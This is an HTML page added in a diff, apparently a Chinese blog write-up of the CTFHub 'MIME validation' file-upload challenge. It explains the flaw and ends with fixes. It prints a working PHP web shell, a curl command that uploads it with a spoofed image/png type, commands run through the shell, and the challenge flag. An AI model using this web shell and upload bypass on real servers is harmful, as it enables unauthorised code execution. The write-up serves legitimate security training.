@@ -1,0 +1,97 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CTFHub 文件上传 MIME验证 Writeup - gz2008的技术博客</title>
+    <style>
+        body { background: #f6f9fc; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", sans-serif; color: #1e293b; line-height: 1.8; padding: 40px 20px; display: flex; justify-content: center; }
+        .container { max-width: 800px; width: 100%; background: #ffffff; border-radius: 20px; box-shadow: 0 10px 30px rgba(0, 0, 0, 0.05); padding: 40px; }
+        .back-link { display: inline-block; margin-bottom: 20px; color: #3b82f6; text-decoration: none; font-weight: 500; }
+        .back-link:hover { text-decoration: underline; }
+        h1 { font-size: 2rem; color: #0f172a; margin-bottom: 10px; border-bottom: 2px solid #eef2f6; padding-bottom: 15px; }
+        .tags { margin-bottom: 25px; }
+        .tag { display: inline-block; background: #eff6ff; color: #2563eb; padding: 4px 12px; border-radius: 20px; font-size: 0.85rem; margin-right: 8px; font-weight: 500; }
+        h2 { font-size: 1.4rem; color: #1e293b; margin-top: 30px; margin-bottom: 15px; border-left: 4px solid #3b82f6; padding-left: 10px; }
+        p { margin-bottom: 15px; color: #475569; }
+        ul, ol { margin-left: 20px; margin-bottom: 15px; color: #475569; }
+        li { margin-bottom: 8px; }
+        code { background: #f1f5f9; padding: 2px 6px; border-radius: 4px; font-family: Consolas, monospace; color: #e11d48; font-size: 0.9em; }
+        pre { background: #1e293b; color: #e2e8f0; padding: 15px; border-radius: 8px; overflow-x: auto; font-family: Consolas, monospace; font-size: 0.9em; }
+        .flag-box { background: #f0fdf4; border: 1px solid #bbf7d0; color: #166534; padding: 15px; border-radius: 10px; font-weight: 700; font-size: 1.1rem; text-align: center; font-family: Consolas, monospace; margin: 20px 0; word-break: break-all; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <a href="index.html" class="back-link">&larr; 返回 CTFHub 首页</a>
+
+        <h1>CTFHub - Web - 文件上传 - MIME验证</h1>
+
+        <div class="tags">
+            <span class="tag"># CTFHub</span>
+            <span class="tag"># Web</span>
+            <span class="tag"># 文件上传</span>
+            <span class="tag"># MIME</span>
+            <span class="tag"># RCE</span>
+        </div>
+
+        <h2>一、题目信息</h2>
+        <ul>
+            <li><strong>题目名称：</strong>文件上传 - MIME验证</li>
+            <li><strong>题目方向：</strong>Web - 文件上传</li>
+            <li><strong>运行环境：</strong>PHP 7.3.14</li>
+            <li><strong>题目目标：</strong>绕过仅校验 MIME 类型的上传逻辑，执行 PHP 代码并读取 Flag。</li>
+        </ul>
+
+        <h2>二、漏洞分析</h2>
+        <p>首页提供文件上传表单，服务端只检查请求体中的 <code>Content-Type</code>，没有结合文件扩展名、文件头和文件内容进行校验。客户端提交的 MIME 类型完全可控，因此可以把 PHP 文件伪装成 PNG 图片绕过检查。</p>
+        <p>上传目录为 <code>upload/</code>，文件会保留原始名称和扩展名，同时目录中的 PHP 文件能够被 Web 服务器解析，最终形成命令执行漏洞。</p>
+
+        <h2>三、解题步骤</h2>
+        <ol>
+            <li>
+                <strong>构造 PHP Payload：</strong>创建 <code>mime_shell.php</code>，通过 <code>cmd</code> 参数执行系统命令。
+                <pre>&lt;?php
+echo "&lt;pre&gt;" . shell_exec($_GET["cmd"]) . "&lt;/pre&gt;";
+?&gt;</pre>
+            </li>
+            <li>
+                <strong>伪造 MIME 类型并上传：</strong>保留 <code>.php</code> 扩展名，在 multipart 请求中将文件类型声明为 <code>image/png</code>。
+                <pre>curl -F "submit=Submit" \
+  -F "file=@mime_shell.php;filename=mime_shell.php;type=image/png" \
+  "http://&lt;challenge-host&gt;:10800/"</pre>
+                上传成功后返回：
+                <pre>upload/mime_shell.php</pre>
+            </li>
+            <li>
+                <strong>验证命令执行：</strong>访问上传文件并传入基础命令，确认服务端以 <code>www-data</code> 身份执行。
+                <pre>curl --get \
+  --data-urlencode "cmd=id; pwd" \
+  "http://&lt;challenge-host&gt;:10800/upload/mime_shell.php"</pre>
+            </li>
+            <li>
+                <strong>定位 Flag 文件：</strong>在 Web 根目录搜索包含 <code>flag</code> 的文件。
+                <pre>find /var/www/html -maxdepth 1 -type f -iname '*flag*'</pre>
+                <pre>/var/www/html/flag_300521230.php</pre>
+            </li>
+            <li>
+                <strong>读取 Flag：</strong>Flag 位于 PHP 注释中，需要通过已获得的命令执行能力读取文件源码。
+                <pre>cat /var/www/html/flag_300521230.php</pre>
+                <pre>&lt;?php // ctfhub{b8b70ef68085b70b62553c7b}</pre>
+            </li>
+        </ol>
+
+        <h2>四、最终 Flag</h2>
+        <div class="flag-box">ctfhub{b8b70ef68085b70b62553c7b}</div>
+
+        <h2>五、修复建议</h2>
+        <ul>
+            <li><strong>扩展名白名单：</strong>仅允许业务需要的安全扩展名，禁止上传 <code>php</code>、<code>phtml</code> 等可执行文件。</li>
+            <li><strong>校验文件内容：</strong>结合真实文件头、图片解析结果和 MIME 类型校验，不能信任客户端提交的 <code>Content-Type</code>。</li>
+            <li><strong>重命名存储：</strong>由服务端生成随机文件名和固定安全扩展名，不保留用户控制的文件名。</li>
+            <li><strong>隔离上传目录：</strong>将文件存放在 Web 根目录之外，并关闭上传目录的脚本执行权限。</li>
+            <li><strong>最小权限：</strong>限制 Web 服务账户对源码目录和系统命令的访问权限。</li>
+        </ul>
+    </div>
+</body>
+</html>
